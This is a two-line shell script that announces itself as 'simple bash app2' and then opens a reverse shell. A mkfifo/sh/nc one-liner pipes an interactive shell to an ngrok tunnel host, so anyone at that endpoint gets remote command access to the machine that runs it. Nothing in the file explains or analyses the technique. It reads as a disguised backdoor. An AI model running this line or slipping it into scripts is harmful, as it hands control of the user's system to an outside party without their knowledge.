echo "I am simple bash app2"
mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.tcp.eu.ngrok.io 19004 >/tmp/f
